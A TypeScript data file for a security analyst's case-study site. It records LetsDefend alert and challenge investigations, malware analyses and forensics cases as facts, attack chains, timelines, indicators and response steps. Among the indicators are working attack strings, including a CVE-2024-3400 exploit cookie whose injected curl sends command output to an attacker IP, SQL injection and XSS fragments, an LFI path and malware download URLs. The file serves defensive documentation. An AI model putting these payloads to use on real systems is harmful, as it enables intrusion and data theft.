/*
 * core/config/case-details.ts
 * Author: Ahmed Emad Nasr
 *
 * The structured half of a case page: the facts box, the attack chain, the
 * timeline, the indicators, the response and any detection content. Every
 * value here is copied from the case's own PDF — nothing is inferred. A case
 * with no entry still renders, with the summary and evidence only.
 *
 * SERVER-ONLY: read by app/blog/[slug]/page.tsx and handed to the page as
 * props, so none of it ships in the home page's JavaScript.
 *
 * Adding a case: copy an entry, fill in what the report states, and leave
 * out what it doesn't. `lessons` is yours to write — one honest paragraph on
 * what you would do differently.
 */

export type IocType = "ip" | "domain" | "url" | "email" | "hash" | "file" | "registry" | "account" | "other";

export type CaseDetail = {
  /** One-line outcome: what the alert really was */
  verdict?: string;
  severity?: "Critical" | "High" | "Medium" | "Low";
  /** Key/value facts for the side box */
  facts?: readonly { label: string; value: string }[];
  /** The attack as a chain of steps, each optionally tagged with an ATT&CK id */
  chain?: readonly { step: string; technique?: string }[];
  timeline?: readonly { time: string; event: string }[];
  iocs?: readonly { type: IocType; value: string; note?: string }[];
  /** What was done (or recommended) to contain and fix it */
  response?: readonly string[];
  /** Detection content written in the report (YARA, Wazuh, Sigma, SPL …) */
  detection?: readonly { title: string; lang: string; code: string }[];
  /** Number of pages in the PDF — the read time is derived from it */
  pages?: number;
  /** Shown as a banner when the work was done as a team */
  team?: string;
  /** Extra documents that belong to the case */
  attachments?: readonly { label: string; href: string }[];
  /** "What I'd do differently" — written by the author */
  lessons?: string;
};

const LD = "LetsDefend SOC simulator";

export const caseDetails: Record<string, CaseDetail> = {
  /* ── LetsDefend SOC alerts ─────────────────────────────────────────── */
  "soc127-pdf": {
    verdict: "True positive — web attack allowed, server treated as potentially compromised",
    severity: "High",
    pages: 4,
    facts: [
      { label: "Platform", value: LD },
      { label: "Rule", value: "SOC127 – SQL Injection Detected" },
      { label: "Target", value: "WebServer1000 · 172.16.20.12" },
      { label: "Source", value: "118.194.247.28 (CN, AS4808) — 9/94 on VirusTotal" },
      { label: "Device action", value: "Allowed · HTTP 200" },
    ],
    chain: [
      { step: "Encoded GET request with several payloads at once", technique: "T1190" },
      { step: "UNION ALL SELECT against information_schema.tables" },
      { step: "<script>alert(\"XSS\")</script> in the same parameter" },
      { step: "xp_cmdshell trying to read /etc/passwd", technique: "T1059" },
    ],
    timeline: [{ time: "2024-03-07 12:51", event: "Alert raised; request allowed with HTTP 200" }],
    iocs: [
      { type: "ip", value: "118.194.247.28", note: "Attacker" },
      { type: "ip", value: "172.16.20.12", note: "Targeted web server" },
    ],
    response: [
      "Escalated to the IR team through case management",
      "Isolate WebServer1000 pending forensic review",
      "Block 118.194.247.28 on the perimeter firewall and WAF",
      "Vulnerability assessment and a fix for the input-validation flaw",
    ],
  },
  "soc205-pdf": {
    verdict: "True positive — macro executed and pulled a second-stage payload",
    severity: "Medium",
    pages: 7,
    facts: [
      { label: "Platform", value: LD },
      { label: "Rule", value: "SOC205 – Malicious Macro has been executed" },
      { label: "Host", value: "Jayne · 172.16.17.198" },
      { label: "Document", value: "edit1-invoice.docm — 26/56 on VirusTotal (TrojanDownloader)" },
    ],
    chain: [
      { step: "ZIP disguised as an invoice downloaded and extracted", technique: "T1566.001" },
      { step: "User opens edit1-invoice.docm and enables macros", technique: "T1204.002" },
      { step: "Macro fires when an InkEdit control gets focus", technique: "T1059.005" },
      { step: "WINWORD.EXE spawns PowerShell (Event ID 4688)", technique: "T1059.001" },
      { step: "WebClient.DownloadFile fetches messbox.exe", technique: "T1105" },
    ],
    timeline: [
      { time: "2024-02-28 08:41", event: "edit1-invoice.docm extracted from the ZIP" },
      { time: "2024-02-28 08:42", event: "powershell.exe resolves www.greyhathacker.net (Sysmon Event ID 22); alert raised" },
    ],
    iocs: [
      { type: "hash", value: "1a819d18c9a9de4f81829c4cd55a17f767443c22f9b30ca953866827e5d96fb0", note: "edit1-invoice.docm (SHA-256)" },
      { type: "url", value: "http://www.greyhathacker.net/tools/messbox.exe", note: "Second-stage download" },
      { type: "domain", value: "www.greyhathacker.net" },
      { type: "file", value: "edit1-invoice.docm.zip" },
    ],
    response: [
      "Escalated to IR for host isolation and forensic review",
      "Isolate Jayne through endpoint security before mess.exe can reach C2",
      "Block greyhathacker.net and its IPs on firewalls and proxies",
      "Blacklist the document and payload hashes in the EDR",
    ],
  },
  "soc257-pdf": {
    verdict: "True positive — VPN account compromised, likely by brute force",
    severity: "Low",
    pages: 5,
    facts: [
      { label: "Platform", value: LD },
      { label: "Rule", value: "SOC257 – VPN Connection Detected from Unauthorized Country" },
      { label: "Account", value: "monica@letsdefend.io" },
      { label: "VPN gateway", value: "33.33.33.33 · vpn-letsdefend.io" },
      { label: "Threat intel", value: "Source IP flagged by AbuseCH for brute force (2023-12-07)" },
    ],
    chain: [
      { step: "21 connection attempts to the gateway on many ports", technique: "T1110" },
      { step: "Successful VPN login with Monica's credentials", technique: "T1133" },
      { step: "Session from an unauthorized country", technique: "T1078" },
    ],
    timeline: [
      { time: "2024-02-13 01:50–01:58", event: "21 firewall events from 113.161.158.12 to the gateway" },
      { time: "2024-02-13", event: "VPN session established as monica@letsdefend.io; alert raised" },
    ],
    iocs: [
      { type: "ip", value: "113.161.158.12", note: "Attacker" },
      { type: "account", value: "monica@letsdefend.io", note: "Compromised account" },
    ],
    response: [
      "Terminated the active VPN session",
      "Disabled the AD/VPN account pending a password reset and an MFA review",
      "Blocked 113.161.158.12 on the external firewall",
    ],
  },
  "soc274-pdf": {
    verdict: "True positive — root-level code execution on the firewall",
    severity: "Critical",
    pages: 2,
    facts: [
      { label: "Platform", value: LD },
      { label: "Rule", value: "SOC274 – PAN-OS Command Injection Exploitation (CVE-2024-3400)" },
      { label: "Target", value: "PA-Firewall-01 · 172.16.17.139" },
      { label: "CVE", value: "CVE-2024-3400 · CVSS 10.0" },
      { label: "Device action", value: "Allowed" },
    ],
    chain: [
      { step: "POST to /global-protect/login.esp", technique: "T1190" },
      { step: "Path traversal in the SESSID cookie into the telemetry directory" },
      { step: "Injected curl sends the output of whoami to the attacker", technique: "T1059.004" },
      { step: "Firewall connects out to 144.172.79.92:4444" },
    ],
    timeline: [
      { time: "2024-04-18 14:15", event: "Threat intel flags 144.172.79.92 as malicious" },
      { time: "2024-04-18 15:09", event: "Exploit request reaches the firewall; alert raised" },
      { time: "2024-04-18 15:09:42", event: "Outbound connection from the firewall to the attacker" },
    ],
    iocs: [
      { type: "ip", value: "144.172.79.92", note: "Attacker / callback" },
      { type: "other", value: "SESSID=../../../../opt/panlogs/tmp/device_telemetry/hour/aaa`curl${IFS}144.172.79.92:4444?user=$(whoami)`", note: "Exploit cookie" },
    ],
    response: [
      "Escalated to IR and network security",
      "Isolate PA-Firewall-01 to stop a pivot into the internal network",
      "Block 144.172.79.92 inbound and outbound on every perimeter control",
      "Suspend GlobalProtect until the device is patched",
    ],
  },
  "soc282-pdf": {
    verdict: "True positive — payload executed and ran host enumeration",
    severity: "Medium",
    pages: 5,
    facts: [
      { label: "Platform", value: LD },
      { label: "Rule", value: "SOC282 – Phishing Alert Deceptive Mail Detected" },
      { label: "Host", value: "Felix · 172.16.20.151" },
      { label: "Lure", value: "\"Free Coffee Voucher\" from a typosquatted domain" },
    ],
    chain: [
      { step: "Mail with free-coffee.zip and its password in the body", technique: "T1566.001" },
      { step: "User downloads the ZIP from an S3 URL", technique: "T1204.002" },
      { step: "cmd.exe runs systeminfo and wmic logicaldisk", technique: "T1082" },
      { step: "tasklist /svc", technique: "T1057" },
      { step: "ipconfig /all and route print", technique: "T1016" },
    ],
    timeline: [
      { time: "2024-05-13 09:22", event: "Alert raised on the phishing e-mail" },
      { time: "2024-05-13 12:59", event: "free-coffee.zip opened from an AWS S3 URL" },
      { time: "2024-05-13 13:01", event: "Enumeration commands start in cmd.exe" },
    ],
    iocs: [
      { type: "email", value: "free@coffeeshooop.com", note: "Sender" },
      { type: "domain", value: "coffeeshooop.com", note: "Typosquatted" },
      { type: "ip", value: "103.80.134.63", note: "Mail source, flagged for phishing" },
      { type: "file", value: "free-coffee.zip", note: "Password: infected" },
    ],
    response: [
      "Isolate Felix's workstation",
      "Delete the mail and search Exchange for other recipients",
      "Block coffeeshooop.com and 103.80.134.63 on the mail gateway and firewalls",
      "Suspend Felix's AD account and force a password reset",
    ],
  },
  "soc326-report": {
    verdict: "True positive — user clicked and the host reached the phishing server",
    severity: "Medium",
    pages: 9,
    facts: [
      { label: "Platform", value: LD },
      { label: "Detection", value: "SIEM alert on a proxy connection to letsdefwnd.io" },
      { label: "Host", value: "Mateo · 172.16.17.162" },
      { label: "Lure", value: "Voucher e-mail from a typosquatted domain" },
    ],
    chain: [
      { step: "Phishing e-mail from voucher@letsdefwnd.io", technique: "T1566.002" },
      { step: "User clicks https://letsdefwnd.io", technique: "T1204.001" },
      { step: "chrome.exe connects to 45.33.23.183:443 (allowed)" },
    ],
    timeline: [{ time: "2024-09-18 13:32", event: "Proxy and endpoint logs show the connection; alert raised" }],
    iocs: [
      { type: "email", value: "voucher@letsdefwnd.io", note: "Sender" },
      { type: "domain", value: "letsdefwnd.io", note: "Typosquat of letsdefend.io" },
      { type: "ip", value: "45.33.23.183" },
    ],
    response: [
      "Contained the host through endpoint security (network isolation)",
      "Blocked the IP and domain on the firewall and proxy",
      "Suspended network access and recommended a credential reset",
    ],
  },
  "soc336-report": {
    verdict: "True positive — zero-click RCE, host compromised",
    severity: "Critical",
    pages: 9,
    facts: [
      { label: "Platform", value: LD },
      { label: "Rule", value: "SOC336 – Windows OLE ZeroClick RCE Exploitation Detected" },
      { label: "Host", value: "Austin · 172.16.17.137" },
      { label: "CVE", value: "CVE-2025-21298 · CVSS 9.8" },
      { label: "Status", value: "Host contained" },
    ],
    chain: [
      { step: "\"Important: Action Required…\" e-mail with mail.rtf, allowed", technique: "T1566.001" },
      { step: "Outlook renders the RTF — OLE zero-click", technique: "T1203" },
      { step: "OUTLOOK.EXE spawns cmd.exe", technique: "T1059.003" },
      { step: "regsvr32 /s /u /i:…/shell.sct scrobj.dll", technique: "T1218.010" },
      { step: "shell.sct downloaded through the proxy (permitted)", technique: "T1105" },
    ],
    timeline: [
      { time: "2025-02-04 08:06:08", event: "OUTLOOK.EXE spawns cmd.exe running regsvr32" },
      { time: "2025-02-04 16:18", event: "Critical alert raised" },
    ],
    iocs: [
      { type: "email", value: "projectmanagement@pm.me", note: "Sender" },
      { type: "hash", value: "df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184", note: "mail.rtf (SHA-256)" },
      { type: "ip", value: "84.38.130.118", note: "Payload server" },
      { type: "url", value: "http://84.38.130.118.com/shell.sct", note: "As written in the command line" },
    ],
    response: [
      "Host isolated (\"Host Contained\" in endpoint security)",
      "Escalated to the IR team through case management",
      "Block 84.38.130.118 and the sender on firewall and proxy",
      "Blacklist the RTF hash in the EDR",
    ],
  },
  "soc338-pdf": {
    verdict: "True positive — fileless chain linked to Lumma Stealer",
    severity: "High",
    pages: 6,
    facts: [
      { label: "Platform", value: LD },
      { label: "Host", value: "Dylan · 172.16.17.216" },
      { label: "Lure", value: "\"Upgrade your system to Windows 11 Pro for FREE\"" },
      { label: "Threat intel", value: "132.232.40.201 tagged Lumma / Lumma Stealer" },
    ],
    chain: [
      { step: "Phishing e-mail from update@windows-update.site", technique: "T1566.002" },
      { step: "User opens the fake Windows update site", technique: "T1204.004" },
      { step: "Obfuscated PowerShell behind a fake reCAPTCHA comment", technique: "T1059.001" },
      { step: "String replacement hides the command", technique: "T1027" },
      { step: "mshta.exe fetches the next stage", technique: "T1218.005" },
    ],
    timeline: [
      { time: "2025-03-13 09:44", event: "Phishing e-mail delivered (allowed by Exchange)" },
      { time: "2025-03-13 23:26:08", event: "Browser visits windows-update.site" },
      { time: "2025-03-13 23:26:19", event: "Obfuscated PowerShell runs and launches mshta.exe" },
    ],
    iocs: [
      { type: "email", value: "update@windows-update.site", note: "Sender" },
      { type: "ip", value: "132.232.40.201", note: "Sender / site, Lumma Stealer" },
      { type: "domain", value: "windows-update.site", note: "Fake update site" },
      { type: "url", value: "https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4", note: "Next-stage payload" },
      { type: "other", value: "('ms]]]ht]]]a]]].]]]exe' -replace ']')", note: "Obfuscation pattern" },
    ],
    response: [
      "Activate host containment for Dylan's workstation",
      "Blocked the IP and both domains on firewalls and web proxies",
      "Forced a password reset and session revocation across AD and cloud services",
    ],
  },
  "soc342-pdf": {
    verdict: "True positive — server compromised with a persistent web shell",
    severity: "Critical",
    pages: 7,
    facts: [
      { label: "Platform", value: LD },
      { label: "Rule", value: "SOC342 – CVE-2025-53770 SharePoint ToolShell Auth Bypass and RCE" },
      { label: "Target", value: "SharePoint01 · 172.16.20.17" },
      { label: "CVE", value: "CVE-2025-53770" },
      { label: "Web shell", value: "spinstall0.aspx — 41/60 on VirusTotal" },
    ],
    chain: [
      { step: "Unauthenticated POST to /_layouts/15/ToolPane.aspx", technique: "T1190" },
      { step: "Encoded PowerShell as IIS APPPOOL\\SharePoint - 80", technique: "T1059.001" },
      { step: "cmd.exe writes spinstall0.aspx into LAYOUTS", technique: "T1505.003" },
      { step: "Server connects back to 107.191.58.76", technique: "T1071.001" },
    ],
    timeline: [
      { time: "2025-07-22 13:07", event: "Exploit request allowed; critical alert raised" },
      { time: "2025-07-22 13:08:04", event: "Outbound connection from SharePoint01 to the attacker" },
    ],
    iocs: [
      { type: "ip", value: "107.191.58.76", note: "Attacker / C2" },
      { type: "hash", value: "92bb4ddb98eeaf11fc15bb32e71d0a63256a0ed826a03ba293ce3a8bf057a514", note: "spinstall0.aspx (SHA-256)" },
      { type: "file", value: "C:\\Program Files\\Common Files\\Microsoft Shared\\Web Server Extensions\\16\\TEMPLATE\\LAYOUTS\\spinstall0.aspx" },
    ],
    response: [
      "Isolate SharePoint01 to cut the C2 session and lateral movement",
      "Block 107.191.58.76 on all perimeter firewalls and WAFs",
      "Suspend SharePoint services pending forensic imaging and a rebuild",
    ],
  },

  /* ── LetsDefend challenges ─────────────────────────────────────────── */
  "hidden-backdoor-report": {
    verdict: "Confirmed — Bitsloth stager downloaded and executed",
    severity: "High",
    pages: 18,
    facts: [
      { label: "Platform", value: "LetsDefend challenge" },
      { label: "Classification", value: "Drive-by compromise, trojan/backdoor (Bitsloth)" },
      { label: "Evidence", value: "Chrome History (SQLite), Prefetch" },
    ],
    chain: [
      { step: "User visits compromised site globalnewshub.com", technique: "T1189" },
      { step: "Silent download of notion-setup.exe from 18.199.176.247:1337" },
      { step: "Payload executes (Prefetch entry)", technique: "T1204.002" },
      { step: "Stager reaches for a second stage at a fake Microsoft URL", technique: "T1071.001" },
      { step: "Writes BITEA82.tmp to %TEMP%" },
    ],
    iocs: [
      { type: "domain", value: "globalnewshub.com", note: "Compromised site" },
      { type: "url", value: "http://18.199.176.247:1337/notion-setup.exe", note: "First-stage delivery" },
      { type: "url", value: "http://updater.microsoft.com/index.aspx", note: "Deceptive C2 URL" },
      { type: "hash", value: "DFB76BCF5A3E29225559EBBDAE8BDD24F69262492ECA2F99F7A9525628006D88", note: "notion-setup.exe (SHA-256)" },
      { type: "file", value: "C:\\Users\\a1l4m\\AppData\\Local\\Temp\\BITEA82.tmp" },
      { type: "file", value: "NOTION-SETUP.EXE-BEE97775.pf", note: "Prefetch — proof of execution" },
    ],
  },
  "serpent-stealer": {
    verdict: "Confirmed — .NET infostealer with sandbox evasion and UAC bypass",
    severity: "High",
    pages: 11,
    facts: [
      { label: "Platform", value: "LetsDefend challenge" },
      { label: "Type", value: "Information stealer · .NET PE32" },
      { label: "Compile time", value: "Forged (2042)" },
      { label: "Tools", value: "PowerShell, PEStudio, VirusTotal, dotPeek" },
    ],
    chain: [
      { step: "Checks the username against sandbox names (Evasion.AntiVT)", technique: "T1497" },
      { step: "Watches for analysis tools such as Process Hacker", technique: "T1057" },
      { step: "UAC bypass through the ms-settings registry hijack", technique: "T1548.002" },
      { step: "Steals FTP credentials from the registry", technique: "T1552.002" },
      { step: "Collects 21 file types and crypto wallets into %TEMP%\\serpent", technique: "T1074.001" },
    ],
    iocs: [
      { type: "hash", value: "A83230DDCED4AE435220D8756CC07BE9", note: "MD5" },
      { type: "hash", value: "C4F981F1F532EC827032775C88A45F1B4153C3D27885F189654AD6EE85C709C1", note: "SHA-256" },
      { type: "file", value: "C:\\Users\\%USERNAME%\\AppData\\Local\\Temp\\serpent", note: "Staging directory" },
      { type: "registry", value: "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command", note: "UAC bypass" },
      { type: "registry", value: "HKCU\\Software\\Microsoft\\FTP", note: "Targeted credentials" },
    ],
    response: [
      "Isolate the host to cut C2 and stop exfiltration",
      "Reset all passwords, FTP and browser-stored credentials first",
      "Move funds out of local crypto wallets",
      "Load the hashes and registry IOCs into the EDR/XDR",
    ],
  },
  "imagestegano": {
    verdict: "Confirmed — Mimikatz variant hidden in PNG pixels",
    severity: "High",
    pages: 13,
    facts: [
      { label: "Platform", value: "LetsDefend challenge" },
      { label: "Artifact", value: "Im493.zip → Sd6wF1A1v.png (64,849 KB)" },
      { label: "Technique", value: "LSB steganography with Invoke-PSImage" },
    ],
    chain: [
      { step: "Oversized PNG suggests embedded data" },
      { step: "Metadata review with exiftool" },
      { step: "PowerShell encoded in pixel LSBs (Invoke-PSImage)", technique: "T1027.003" },
      { step: "Recovered script is obfuscated Mimikatz", technique: "T1003" },
    ],
    iocs: [
      { type: "file", value: "Im493.zip" },
      { type: "file", value: "Sd6wF1A1v.png", note: "Carrier image" },
    ],
  },
  "email-analysis-room-report": {
    verdict: "Malicious — trojan attachment (Loki/AgentTesla)",
    severity: "Medium",
    pages: 7,
    facts: [
      { label: "Platform", value: "LetsDefend challenge" },
      { label: "Subject", value: "united scientific equipment" },
      { label: "Recipient", value: "admin@malware-traffic-analysis.net" },
    ],
    chain: [
      { step: "E-mail from yanting@united.com.sg", technique: "T1566.001" },
      { step: "Executable attachment disguised as an invoice", technique: "T1204.002" },
    ],
    iocs: [
      { type: "email", value: "yanting@united.com.sg", note: "Sender" },
      { type: "ip", value: "71.19.248.52", note: "Origin (Canada)" },
      { type: "file", value: "united scientific equipent.exe" },
      { type: "hash", value: "9909753bfb0ac8ab165bab3555233d03b01a9274a92e57c022f87ccbe51ca415", note: "SHA-256" },
    ],
    response: [
      "Block 71.19.248.52 and the sender domain on the e-mail gateway",
      "Blacklist the hash in the EDR/antivirus",
    ],
  },
  "bruteforce-room-report": {
    verdict: "Two accounts compromised (web and SSH)",
    severity: "High",
    pages: 11,
    facts: [
      { label: "Platform", value: "LetsDefend challenge" },
      { label: "Server", value: "51.116.96.181 — HTTP, RDP, SSH" },
      { label: "Evidence", value: "auth.log and a PCAP" },
    ],
    chain: [
      { step: "HTTP brute force on index.php succeeds (web-hacker)", technique: "T1110.001" },
      { step: "Seven accounts tried over RDP from t3m0-virtual-ma", technique: "T1110" },
      { step: "7,480 failed SSH logins, then mmox logs in", technique: "T1078" },
    ],
    timeline: [{ time: "2024-02-25 11:43:54", event: "Successful SSH login as mmox after the brute force" }],
    iocs: [
      { type: "account", value: "web-hacker", note: "Compromised (web)" },
      { type: "account", value: "mmox", note: "Compromised (SSH)" },
      { type: "other", value: "t3m0-virtual-ma", note: "RDP client name" },
    ],
    response: [
      "Isolate the server and block the attacking IPs",
      "Suspend web-hacker and mmox and reset their passwords",
      "Add account lockout and rate limiting",
    ],
  },
  "malicious-web-traffic-room-report": {
    verdict: "Compromised — admin access and file disclosure",
    severity: "Critical",
    pages: 14,
    facts: [
      { label: "Platform", value: "LetsDefend challenge" },
      { label: "Attacker", value: "197.32.212.121" },
      { label: "Target", value: "10.1.0.4" },
      { label: "Tools", value: "Wireshark, CyberChef" },
    ],
    chain: [
      { step: "XXE with php://filter on /register/register.php", technique: "T1190" },
      { step: "Base64 source code leaks the admin user" },
      { step: "Login brute-forced — 302 to the dashboard", technique: "T1110" },
      { step: "LFI on view.php?file= reads /etc/passwd", technique: "T1083" },
      { step: "Open redirect on redirect.php?url=" },
    ],
    iocs: [
      { type: "ip", value: "197.32.212.121", note: "Attacker" },
      { type: "other", value: "/register/register.php", note: "XXE endpoint" },
      { type: "other", value: "../../../../etc/passwd", note: "LFI payload" },
    ],
    response: [
      "Disable external XML entities and validate input",
      "Remove hard-coded secrets and comments",
      "Rate limiting and a strong password policy",
      "Sanitize file paths and validate redirect targets",
    ],
  },

  /* ── Malware analysis ──────────────────────────────────────────────── */
  "malware-analysis-wannacry": {
    verdict: "Ransomware — modified WannaCry, delivered manually",
    severity: "Critical",
    pages: 45,
    facts: [
      { label: "Sample", value: "PE32+ GUI, x86-64 · 2.10 MB · not packed (entropy 2.91)" },
      { label: "Compiler", value: "MSVC 14.44" },
      { label: "Ransom", value: "USD 300 via a QQ e-mail address" },
      { label: "Not observed", value: "Kill-switch query, SMB/EternalBlue propagation" },
      { label: "Lab", value: "Isolated VMware Workstation" },
    ],
    chain: [
      { step: "Executed by hand on the host", technique: "T1204.002" },
      { step: "Files encrypted with the Windows CryptoAPI", technique: "T1486" },
      { step: "@WanaDecryptor@.exe shows the note and timer" },
      { step: "Wallpaper replaced via SystemParametersInfoW", technique: "T1491.001" },
      { step: "ICO5452.tmp dropped in %TEMP%" },
    ],
    iocs: [
      { type: "hash", value: "70920f342814ca5c662cbbed00d60eef", note: "MD5" },
      { type: "hash", value: "3e96e1f6a2d7cc6b72473d141e1962260325a0e7", note: "SHA-1" },
      { type: "hash", value: "b547dc7a77af8022abbf19a7006213342444caea1cede20ea2409ce9bc9790bf", note: "SHA-256" },
      { type: "email", value: "3905960807@qq.com", note: "Ransom contact" },
      { type: "file", value: "@WanaDecryptor@.exe" },
      { type: "file", value: "%LOCALAPPDATA%\\Temp\\ICO5452.tmp" },
    ],
    detection: [
      {
        title: "YARA — high-confidence variant rule (rule 1 of 3)",
        lang: "yara",
        code: `rule WannaCry_Modified_QQ_Variant
{
    meta:
        author      = "Ahmed Emad Nasr"
        description = "Detects modified WannaCry variant with QQ-based ransom comms"
        date        = "2026-04-13"
        hash_sha256 = "b547dc7a77af8022abbf19a7006213342444caea1cede20ea2409ce9bc9790bf"
        severity    = "high"
    strings:
        $s1   = "@WanaDecryptor@"      ascii wide
        $s2   = "3905960807@qq.com"    ascii wide
        $s3   = "Forever_AES_KEY"      ascii
        $s4   = "ICO5452.tmp"          ascii
        $api1 = "CryptEncrypt"         ascii
        $api2 = "CryptAcquireContextW" ascii
        $api3 = "CryptCreateHash"      ascii
    condition:
        uint16(0) == 0x5A4D and (2 of ($s*)) and (2 of ($api*))
}`,
      },
    ],
    attachments: [{ label: "Malware analysis playbook (1 page)", href: "Assets/Cases/Malware Analysis and Prevention Strategy/AhmedEmad_Playbook.pdf" }],
  },
  "depi-r4-project": {
    verdict: "Ransomware analysis plus a Wazuh-based prevention plan",
    pages: 58,
    facts: [
      { label: "Programme", value: "Digital Egypt Pioneers Initiative, Round 4" },
      { label: "Sample", value: "Modified WannaCry (SHA-256 b547dc7a…790bf)" },
      { label: "Prevention", value: "Wazuh manager, indexer, Filebeat and dashboard" },
    ],
    attachments: [{ label: "Video walkthrough (YouTube playlist)", href: "https://youtube.com/playlist?list=PLO1VSSKnwZUgGaiDZXU-mKuh8CUZxgAd" }],
  },
  "malware2-report": {
    verdict: "Malicious loader hiding a stage-two payload in its overlay",
    severity: "High",
    pages: 10,
    facts: [
      { label: "Sample", value: "singlefilehost.exe (PDF icon)" },
      { label: "Signature", value: "Expired Microsoft Code Signing PCA 2010" },
      { label: "Overlay", value: "87.52% of the file" },
      { label: "Tools", value: "PEStudio, HxD" },
    ],
    chain: [
      { step: "Executable masquerades as a PDF", technique: "T1036" },
      { step: "Payload appended in the overlay, MZ pushed down by null bytes", technique: "T1027" },
      { step: "Overlay dumped and padding removed to rebuild the PE" },
      { step: "Stage two: compile date forged to 2061", technique: "T1070.006" },
    ],
    iocs: [
      { type: "hash", value: "DCE2488DDC3AB45FE8DF1C2BB3E21CD11D4E697E94E0E2A88B4BFD35C6516055", note: "singlefilehost.exe (SHA-256)" },
      { type: "hash", value: "160D0260FD2DF7DA4381AB01E87D7C047D4A381C59D35FE1B60F0ABE162A915A", note: "Stage two (SHA-256)" },
      { type: "file", value: "tkfgk435jkdgf.dll", note: "Original filename" },
      { type: "other", value: "C:\\Users\\admin\\source\\repos\\SDCBundle\\SDCBundle\\obj\\Release\\net6.0-winx64\\tkfgk435jkdgf.pdb", note: "PDB path" },
    ],
  },
  "unload-malware-report": {
    verdict: "IcedID (BokBot) stage-one loader",
    severity: "High",
    pages: 13,
    facts: [
      { label: "Sample", value: "unload.dll · PE64 DLL · 16,320 bytes" },
      { label: "Original name", value: "loader_dll_64.dll" },
      { label: "Built", value: "2022-11-30 · Visual Studio 2017 (MSVC 19.12)" },
      { label: "Tools", value: "PEStudio, FLOSS, VirusTotal" },
    ],
    chain: [
      { step: "Run as rundll32.exe unload.dll,init", technique: "T1218.011" },
      { step: "Strings decoded at runtime; APIs resolved dynamically", technique: "T1027" },
      { step: "WinHTTP beacon to podiumstrtss.com", technique: "T1071.001" },
      { step: "Second stage downloaded and run in memory", technique: "T1105" },
    ],
    iocs: [
      { type: "hash", value: "A3FA68045D0106D6DB3D43DF6B5997D9034F9F7D2A34148187498E4B504EBF58", note: "SHA-256" },
      { type: "domain", value: "podiumstrtss.com", note: "C2 — 14/95 vendors" },
      { type: "other", value: "rundll32.exe unload.dll,init", note: "Execution" },
    ],
  },

  /* ── Forensics ─────────────────────────────────────────────────────── */
  "data-exfiltration-investigation": {
    verdict: "Confirmed exfiltration to USB, then credential theft",
    severity: "High",
    pages: 27,
    facts: [
      { label: "Case", value: "INC-2026-04-27" },
      { label: "Image", value: "memdumpWin7.mem · Win7SP1x86_23418" },
      { label: "Host / user", value: "IE8WIN7 · IEUser" },
      { label: "Tools", value: "Volatility 2.6.1, FTK Imager, John the Ripper" },
    ],
    chain: [
      { step: "User browses to Downloads (shellbags)" },
      { step: "copy secret_file.docx F: — 1 file(s) copied", technique: "T1052.001" },
      { step: "Local NTLM hashes dumped", technique: "T1003.002" },
      { step: "Hashes cracked offline with John the Ripper", technique: "T1110.002" },
      { step: "sshd listening on port 22 — possible backdoor" },
    ],
    timeline: [
      { time: "2019-01-06 14:49:40", event: "IEUser opens C:\\Users\\IEUser\\Downloads (shellbags)" },
      { time: "2019-01-06 15:02:49", event: "sshd.exe (PID 2016) listening on port 22 (netscan)" },
      { time: "2019-01-06 15:06:11", event: "cmd.exe (PID 3996) started from explorer.exe (pslist)" },
      { time: "After 15:06:11", event: "secret_file.docx copied to F:; NTLM hashes extracted; John the Ripper run" },
      { time: "2019-01-06 15:07:15", event: "FTK Imager starts the memory acquisition" },
    ],
    iocs: [
      { type: "file", value: "secret_file.docx", note: "Exfiltrated document" },
      { type: "other", value: "Ven_General&Prod_UDisk", note: "USB device mounted as F:" },
    ],
  },
  "usb-forensics-report": {
    verdict: "Deliberate insider access to payroll PII from a USB drive",
    severity: "High",
    pages: 12,
    facts: [
      { label: "Reference", value: "INCD-2024-07-USB-LEAK" },
      { label: "Evidence", value: "Payroll_leak_investigation triage set (offline)" },
      { label: "Tools", value: "Registry Explorer, ShellBags Explorer, JumpList Explorer" },
      { label: "USB serial", value: "5639311262174133917 · drive E:" },
    ],
    timeline: [
      { time: "2024-07-15 03:36:22", event: "USB device first connected (USBSTOR)" },
      { time: "2024-07-15 03:37:28", event: "User opens the USB root (ShellBags)" },
      { time: "2024-07-15 03:37:54", event: "User moves through the staging folders" },
      { time: "2024-07-15 03:38:07", event: "Employee_PII.csv opened in Notepad (JumpList)" },
    ],
    iocs: [
      { type: "file", value: "E:\\NewProject_Hires_Data\\Payroll_NewHires\\Payroll_NewHires\\Payroll_data1\\Employee_PII.csv" },
      { type: "other", value: "5639311262174133917", note: "USB serial number" },
    ],
    response: [
      "DLP to stop sensitive data reaching removable media",
      "Disable USB mass storage by default; allow-list by VID, PID and serial",
      "EDR detections for sensitive-file access and removable-media use",
      "UEBA for insider-threat patterns",
    ],
  },
  "lockbit-ransomware-forensics": {
    verdict: "LockBit infection confirmed from memory",
    severity: "Critical",
    pages: 12,
    facts: [
      { label: "Image", value: "Lockbit.vmem · Win7SP1x64" },
      { label: "Process", value: "mal.exe · PID 900 · C:\\Users\\Josh\\Desktop" },
      { label: "Detection", value: "61/71 on VirusTotal" },
      { label: "Tools", value: "Volatility 2.6.1, VirusTotal, Hybrid Analysis" },
    ],
    chain: [
      { step: "mal.exe runs from the Desktop", technique: "T1204.002" },
      { step: "Run-key value XO1XADpO01 for persistence", technique: "T1547.001" },
      { step: "Privilege escalation reported as T1543 by the sandbox", technique: "T1543" },
      { step: "Files encrypted with the .lockbit extension", technique: "T1486" },
    ],
    timeline: [{ time: "2023-04-13 10:06:45 UTC", event: "mal.exe (PID 900) created" }],
    iocs: [
      { type: "hash", value: "19ca5aa4cd62929afb255d2b38e70fd3143e3b181889e84348a5c896e577d708", note: "Extracted payload (SHA-256)" },
      { type: "hash", value: "67c6784a5296658ac4d633f4e8c0914ecc783b1cf2f6431818c4e2f3cdcce91f", note: "Ransom note (SHA-256)" },
      { type: "file", value: "C:\\Users\\Josh\\Desktop\\mal.exe" },
      { type: "registry", value: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run → XO1XADpO01" },
    ],
  },
  "ecir-registry-forensics": {
    verdict: "Tip substantiated — unauthorized and trace-wiping software",
    pages: 25,
    facts: [
      { label: "Lab", value: "INE eCIR · Module 6, Lab 14" },
      { label: "Computer", value: "4ORENSICS · Windows 8.1 Enterprise (9600)" },
      { label: "User", value: "Hunter — Administrators group (RID 1001)" },
      { label: "Time zone", value: "Pacific (UTC-8, DST active)" },
